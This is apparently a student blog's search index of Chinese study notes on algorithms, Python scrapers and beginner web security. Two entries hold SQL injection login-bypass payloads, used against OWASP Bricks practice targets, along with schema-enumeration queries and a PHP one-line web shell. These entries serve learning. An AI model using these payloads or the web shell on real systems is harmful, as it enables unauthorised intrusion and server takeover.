<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[铺地毯问题]]></title>
    <url>%2F2018%2F11%2F04%2F%E9%93%BA%E5%9C%B0%E6%AF%AF%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!刚开始的代码12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int array[10000][10000]=&#123;0&#125;;int main ()&#123; int x,y,a,b,g,h; int n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a,&amp;b,&amp;g,&amp;h); for(int j=a;j&lt;=a+g;j++)//把地毯覆盖的点赋值 &#123; for(int k=b;k&lt;=b+h;k++) &#123; array[j][k]=i; &#125; &#125; &#125; scanf("%d %d",&amp;x,&amp;y); if(array[x][y]==0) &#123; printf("-1"); &#125;else printf("%d",array[x][y]); return 0;&#125; 然后我就去看下大佬是怎么解决的，瞬间就明白了，微笑，默叹，以为妙绝。正确思路应该是这样的，定义一个数组，按顺序保存地毯四个角的坐标，再逆序判断给定点是否在地毯内就行了。改写代码如下，顺利AC，收获挺大的。1234567891011121314151617181920212223#include &lt;stdio.h&gt;int a[10001][5];int main()&#123; int x,y,n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a[i][1],&amp;a[i][2],&amp;a[i][3],&amp;a[i][4]); a[i][3]+=a[i][1]; a[i][4]+=a[i][2]; &#125;//数组只是用来记录第i个地毯的四个点的坐标 scanf("%d %d",&amp;x,&amp;y); for(int i=n;i&gt;=1;i--)//逆序判断地毯是否覆盖（x，y） &#123; if(a[i][1]&lt;=x&amp;&amp;a[i][2]&lt;=y&amp;&amp;a[i][3]&gt;=x&amp;&amp;a[i][4]&gt;=y) &#123;printf("%d",i); return 0; &#125; &#125; printf("-1");//没有则输出-1 return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尝试简单的sql注入]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。https://bbs.pediy.com/thread-218653.htm这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址http://43.247.91.228:83/login-pages.html第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行，比如可以在后面加#，注释掉后面的语句123451' or 1 #1' or 1 or '' or 1 #' or 1 or '1' or 1=1 # 第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。 第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。121') or 1 #1') or 1 or(' 第四题和第三题差不多，只不过使用双引号””包裹字符串。121") or 1 #1") or 1 or (" 第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。 第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法上的一些术语]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%2F</url>
    <content type="text"><![CDATA[我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。 OJ平台 简写 全称 中文称谓 OJ Online Judge 在线判题系统 AC Accepted 通过 WA Wrong Answer 答案错误 TLE Time Limit Exceed 超时 OLE Output Limit Exceed 超过输出限制 MLE Memory Limit Exceed 超内存 RE Runtime Error 运行时错误 PE Presentation Error 格式错误 CE Compile Error 无法编译 算法常用术语英中对照 英语 中文 Approximate String Matching 模糊匹配 Arbitrary Precision Arithmetic 高精度计算 Bandwidth Reduction 带宽压缩 Bin Packing 装箱问题 Calendrical Calculations 日期 Clique 最大团 Combinatorial Problems 组合问题 Computational Geometry 计算几何 Connected Components 连通分支 Constrained and Unconstrained Optimization 最值问题 Convex Hull 凸包 Cryptography 密码 Data Structures 基本数据结构 Determinants and Permanents 行列式 Dictionaries 字典 Discrete Fourier Transform 离散Fourier变换 Drawing Graphs Nicely 图的描绘 Drawing Trees 树的描绘 Edge and Vertex Connectivity 割边/割点 Edge Coloring 边染色 Eulerian Cycle / Chinese Postman Euler 回路/中国邮路 Factoring and Primality Testing 因子分解/质数判定 Feedback Edge/Vertex Set 最大无环子图 Finite State Machine Minimization 有穷自动机简化 Generating Graphs 图的生成 Generating Partitions 划分生成 GeneratingPermutations 排列生成 GeneratingSubsets 子集生成 Graph Data Structures 图形数据结构 Graph Isomorphism 图同构 Graph Partition 图的划分 Graph Problems — hard 图论-NP问题 Graph Problems — polynomial 图论-多项式算法 Hamiltonian Cycle Hamilton 回路 Independent Set 独立集 Intersection Detection 碰撞测试 Job Scheduling 工程安排 Kd-Trees 线段树 Knapsack Problem 背包问题 Linear Programming 线性规划 Longest Common Substring 最长公共子串 Maintaining Line Arrangements 平面分割 Matching 匹配 Matrix Multiplication 矩阵乘法 Medial-Axis Transformation 中轴变换 Median and Selection 中位数 Minimum Spanning Tree 最小生成树 Minkowski Sum Minkowski和 Motion Planning 运动规划 Nearest Neighbor Search 最近点对查询 Network Flow 网络流 Numerical Problems 数值问题 Planarity Detection and Embedding 平面性检测和嵌入 Point Location 位置查询 Polygon Partitioning 多边形分割 Priority Queues 优先队列 Random Number Generation 随机数生成 Range Search 范围查询 rate of convergence 收敛速度 robustness 鲁棒性 Satisfiability 可满足性 Searching 查找 Set and String Problems 集合与串的问题 Set Cover 集合覆盖 Set Data Structures 集合 Shape Similarity 相似多边形 Shortest Common Superstring 最短公共父串 Shortest Path 最短路径 Simplifying Polygons 多边形化简 Solving Linear Equations 线性方程组 Sorting 排序 Steiner Tree Steiner树 String Matching 模式匹配 Text Compression 压缩 Topological Sorting 拓扑排序 Transitive Closure and Reduction 传递闭包 Traveling Salesman Problem 旅行商问题 Triangulation 三角剖分 Vertex Coloring 点染色 Vertex Cover 点覆盖 Voronoi Diagrams Voronoi图]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>术语</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过河卒问题]]></title>
    <url>%2F2018%2F11%2F01%2F%E8%BF%87%E6%B2%B3%E5%8D%92%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。 我的心路历程首先可以发现到达当前坐标的路径数等于左边和上边路径数之和，然后我就想构造二维数组，用遍历的方法，把每一个坐标都算出来。在此之前，我需要把第0行第0列赋值为1，也需要判断马控制的坐标(马走日)在不在数组内，并赋值为0，在循环的时候写判断跳过控制点即可。我的方法就是这么复杂，以至于我刚开始漏掉好多判断条件，比如说当马控制点落在第0行或第0列时，控制点之后都将为0。当我看题解的时候，发现一堆我看不懂的名词，什么动态规划dp，什么滚动数组，还有用递归的方法做。我这个渣渣还是遍历就好了，等我再学一段时间，再来看会不会这些方法，并写进来。 我的代码先附上我的遍历方法，学会更好的方法再补充。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;long long a[21][21];int define_horse_control1(long long array[21][21],int x,int y)//定义一个函数，把马控制的点赋为0&#123; array[x][y]=0; if(x-2&gt;=0&amp;&amp;y-1&gt;=0)array[x-2][y-1]=0;//这里都要判断一下有没有越界 if(x-2&gt;=0&amp;&amp;y+1&lt;=20)array[x-2][y+1]=0; if(x-1&gt;=0&amp;&amp;y-2&gt;=0)array[x-1][y-2]=0; if(x+1&lt;=20&amp;&amp;y-2&gt;=0)array[x+1][y-2]=0; if(x+2&lt;=20&amp;&amp;y-1&gt;=0)array[x+2][y-1]=0; if(y+1&lt;=20&amp;&amp;x+2&lt;=20)array[x+2][y+1]=0; if(x-1&gt;=0&amp;&amp;y+2&lt;=20)array[x-1][y+2]=0; if(x+1&lt;=20&amp;&amp;y+2&lt;=20)array[x+1][y+2]=0; return array[21][21]; &#125;int define_horse_control2(long long array[21][21],int x,int y,int n,int m)//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0&#123; if(x-2==0) &#123; if(y-1&gt;=1) &#123; for(int i=y-1;i&lt;=n;i++)a[0][i]=0; &#125;else &#123;for(int i=y+1;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x-1==0) &#123; if(y-2&gt;=1) &#123; for(int i=y-2;i&lt;=n;i++)a[0][i]=0; &#125;else&#123;for(int i=y+2;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x==0) &#123; for(int i=y;i&lt;=n;i++)a[0][i]=0; &#125; if(y-1==0) &#123; if(x-2&gt;=1) &#123; for(int i=x-2;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+2;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y-2==0) &#123; if(x-1&gt;=1) &#123; for(int i=x-1;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+1;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y==0) &#123; for(int i=x;i&lt;=m;i++)a[i][0]=0; &#125;&#125;int main()&#123; int m,n,x,y; scanf("%d %d %d %d",&amp;m,&amp;n,&amp;x,&amp;y); a[0][0]=0; for(int i=1;i&lt;=n;i++)a[0][i]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 for(int i=1;i&lt;=m;i++)a[i][0]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 define_horse_control1(a,x,y);//把马控制的点赋为0 define_horse_control2(a,x,y,n,m);//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0 for(int i=1;i&lt;=m;i++)//遍历计算到当前坐标的路径数，只需要遍历到第m行和第n列即可。 &#123; for(int j=1;j&lt;=n;j++) &#123; if((i==x-2&amp;&amp;j==y-1)||(i==x-2&amp;&amp;j==y+1)||(i==x-1&amp;&amp;j==y-2)||(i==x+1&amp;&amp;j==y-2)||(i==x+2&amp;&amp;j==y-1)||(j==y+1&amp;&amp;i==x+2)||(i==x-1&amp;&amp;j==y+2)||(i==x+1&amp;&amp;j==y+2)||(i==x&amp;&amp;j==y)) &#123; continue;//跳过马的控制点的计算 &#125; a[i][j]=a[i][j-1]+a[i-1][j];//当前坐标的路径数等于左边和上边路径数之和 &#125; &#125; printf("%lld",a[m][n]); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[冒泡排序]]></title>
    <url>%2F2018%2F10%2F30%2F%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[c刚看到数组，只会写个简单的冒泡排序。发现自己还真是菜，抱着ljr老师的算法书半天都看不懂，没办法只能自己慢慢啃了。 算法原理(摘自百度百科) 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 下面用python实现12345678def bubble_sort(nums): n = len(nums) for i in range(1,n): # n个数，比较n-1趟 for j in range(n - i):#n个数，去掉最后面排好序的(i-1)个数，剩余n-i+1个数比较n-1次，[0,n-i-1]每次判断到下标j=n-1-i即可，因为前闭后开，所以要+1 if nums[j] &gt; nums[j + 1]: nums[j], nums[j + 1] = nums[j + 1], nums[j] return numsprint(bubble_sort([1,4,5,3])) 下面用c实现12345678910111213141516171819202122#include&lt;stdio.h&gt;#define maxn 100000int a[maxn];int main()&#123; int x,n=0; while(scanf("%d",&amp;x)==1) a[n++]=x;//最后一次n又加1,所以,数组下标0到n-1 ,n个数 for(int i=1;i&lt;=n-1;i++)//n个数,比较(n-1)趟 &#123; for(int j=0;j&lt;=n-i-1;j++)//n个数,去掉最后面(i-1)个数,剩余n-i+1个数比较n-i次.每次判断到下标j=n-1-i即可 &#123; if(a[j]&gt;a[j+1]) &#123; a[j] = a[j]+a[j+1]; a[j+1] = a[j]-a[j+1]; a[j]=a[j]-a[j+1]; &#125; &#125; &#125; for(int i=0;i&lt;=n-1;i++)printf("%d ",a[i]); return 0; &#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>python</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[埃氏筛法筛素数]]></title>
    <url>%2F2018%2F10%2F27%2F%E5%9F%83%E6%B0%8F%E7%AD%9B%E6%B3%95%E7%AD%9B%E7%B4%A0%E6%95%B0%2F</url>
    <content type="text"><![CDATA[昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。 埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。下面用python实现12345678910111213141516171819202122232425262728def JudgePrimes(n): primes = [] f = [] for i in range(n+1):#这样写，可以把自然数和列表元素的序号对应起来。 if i &gt; 2 and i%2 == 0:#把从0到n的偶数筛掉。 f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = 2*i while j&lt;=n:#把小于n的所有质数的倍数都筛掉 f[j] = 0 j += i i += 2 primes.append(2)#2是质数 for x in range(3,n+1): if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 算法可以进一步优化123456789101112131415161718192021222324252627def JudgePrimes(n): primes = [] f = [] for i in range(n+1): if i &gt; 2 and i%2 == 0: f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = i*i #直接从质数的平方后开始筛，因为质数的平方之前的数已经被上一个质数筛过了，此时j为奇数 while j &lt;= n: f[j] = 0 j += 2*i #如果只加一个i,j则为i的偶数倍是一个偶数已经被筛过了，所以加2个i筛掉i的奇数倍，小优化。 i += 2 primes.append(2)#2是质数 for x in range(3,n+1,2):#步长为2，把偶数跳过,小优化。 if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 我的c语言抠脚，下面放上照着python写的c程序1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;int main()&#123; int n,j; scanf("%d",&amp;n); int f[n+1]; for(int i=0;i&lt;=n;i++) &#123; if(i&gt;2&amp;&amp;i%2==0)f[i]=0; else f[i]=1; &#125; int i =3; while(i*i&lt;=n) &#123; if(f[i] ==1) &#123; j=i*i; while (j&lt;=n) &#123; f[j]=0; j+=2*i; &#125; &#125; i+=2; &#125; f[2]=1; printf("2 "); for(int k=3;k&lt;=n;k+=2) &#123; if(f[k]==1)printf("%d ",k); &#125; return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取猫眼电影top100]]></title>
    <url>%2F2018%2F10%2F26%2F%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100%2F</url>
    <content type="text"><![CDATA[昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。http://maoyan.com/board/4 用到的模块12import requestsimport re 用正则表达式匹配下载当页信息首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。接下来就是写代码用正则把内匹配下来12345678910111213headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;r = requests.get('http://maoyan.com/board/4?offset=0',headers=headers)results = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S)'''findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替第二个参数是被匹配的文本，传入网页源代码即可因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了''' 再写个循环把提取到的内容写进txt文件即可123456789for i in results: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')'''a表示追加写入，要加上encoding='utf-8'，不然会编码错误i[0] i[1]等表示当前列表里的某个元组的第几个内容我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。''' 写个循环爬取所有页面的内容我们发现网页的地址格式是http://maoyan.com/board/4?offset= + 0,10,20,30…10012345for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i)'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数然后再把上面的代码写成函数，在这个循环里调用即可''' 这次我终于用上函数了附上全部代码,原谅小白的代码吧。12345678910111213141516import requestsimport redef get_information(url): headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125; r = requests.get(url,headers=headers) result = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S) for i in result: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i) get_information(url)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初学python爬虫]]></title>
    <url>%2F2018%2F10%2F22%2F%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。http://www.mzitu.com/zipai/ 用到的模块123import requestsfrom bs4 import BeautifulSoupimport os 找到当前页面图片地址首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。先用get方法获取页面内容，再用BeautifulSoup煲汤。1234r = requests.get('http://www.mzitu.com/zipai/')soup = BeautifulSoup(r.text,'lxml') #需要 pip install lxmllist1 = []list1 = soup.select('p &gt; img') 然后再用for循环提取出img的属性1234list2 =[]for i in list1: list2.append(i.get('src')) print(i.get('src')) 下载图片12345678os.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content) 循环每个页面很容易可以观察到，地址的格式是”http://www.mzitu.com/zipai/comment-page-&quot;+ 页数+”/#comments”因此写个for循环即可遍历地址12for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" 再把url传入上面的方法即可。 小问题因为本人是单身狗，怠惰于面向对象编程，所以代码被我写在一团，实际可以定义几个函数，提升代码的可读性和美观性。下面贴上完整代码，大佬勿喷，哈哈。1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport osos.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" r = requests.get(url) soup = BeautifulSoup(r.text,'lxml') list1 = soup.select('p &gt; img') list2 =[] for i in list1: list2.append(i.get('src')) print(i.get('src')) for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[菜鸟初学web]]></title>
    <url>%2F2018%2F10%2F19%2F%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web%2F</url>
    <content type="text"><![CDATA[密码绕过漏洞:11' or 1 # mysql手工注入:123select table_name from information_schema.tables where table_schema="";select column_name from information_schema.columns where table_name=""; php一句话木马:123&lt;?php @eval($_POST[ 'pass' ]);?&gt;"?&gt;&lt;?php @eval($_POST[ 'pass' ]);?&gt;&lt;?php#]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to my blog.]]></title>
    <url>%2F2018%2F10%2F18%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
